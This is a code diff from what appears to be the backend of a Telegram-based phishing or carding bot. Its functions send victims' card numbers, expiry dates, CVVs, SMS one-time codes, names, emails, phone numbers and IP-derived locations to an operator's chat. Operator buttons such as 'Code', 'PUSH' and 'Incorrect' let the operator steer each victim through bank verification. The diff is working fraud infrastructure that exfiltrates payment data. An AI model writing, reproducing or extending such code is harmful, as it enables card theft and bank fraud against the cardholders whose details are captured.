@@ -13,25 +13,20 @@ def escape_reserved_characters(text):
         text = text.replace(char, f'\\{char}')
     
     return text
-def send_sms(CHAT_ID, card, date, cvv, sms, ID, ip):
+def send_buttons_message(CHAT_ID, card, date, cvv, ID, name, email, tel, ip):
     bot = Bot(token=API_TOKEN)
     keyboard = [
         [
-            InlineKeyboardButton("✅Отработан✅", callback_data='button-ban'),
-            InlineKeyboardButton("Error SMS", callback_data='button2'),
+            InlineKeyboardButton("📱Code📱", callback_data='button1'),
         ],
         [
             InlineKeyboardButton("📲PUSH📲", callback_data='button3'),
+            InlineKeyboardButton("💳Incorrect💳", callback_data='button4'),
         ],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    
-    # Подготовка текста с экранированием специальных символов
-    message_text = f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐 : `{cvv}`\n💬 : `{sms}` \n\n👮🏿‍♂️ {ip}\n🗺 {get_country_by_ip(ip)}'
-    escaped_message_text = escape_reserved_characters(message_text)
-
-    # Отправка сообщения с экранированным текстом
-    bot.send_message(chat_id=CHAT_ID, text=escaped_message_text, reply_markup=reply_markup, parse_mode='MarkdownV2')
+    text = escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐  `{cvv}`\n\n🏦: {Bin(card)[0]}\n🌏: {Bin(card)[1]}\n\n🏷 {name}\n📨 {email}\n📱 {tel}\n\n👮🏿‍♂️ {ip}\n🗺 {get_country_by_ip(ip)}')
+    bot.send_message(chat_id=CHAT_ID, text=text, reply_markup=reply_markup, parse_mode='MarkdownV2')
 
 def send_me1(card, date, cvv, ID):
     bot = Bot(token=api)
@@ -93,7 +88,7 @@ def send_sms(CHAT_ID, card, date, cvv, sms, ID, ip):
         ],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    bot.send_message(chat_id=CHAT_ID, text=escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐 : `{cvv}`\n💬 : `{sms}` \n\n👮🏿‍♂️ {ip}\n🗺 {get_country_by_ip(ip)}'.replace('.', '\.')), reply_markup=reply_markup, parse_mode='MarkdownV2')
+    bot.send_message(chat_id=CHAT_ID, text=escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐 : `{cvv}`\n💬 : `{sms}` \n\n👮🏿‍♂️ {ip}\n🗺 {get_country_by_ip(ip)}'), reply_markup=reply_markup, parse_mode='MarkdownV2')
 
 def ne_pizdabol(card, chat_id='-4150791967'):
     try:
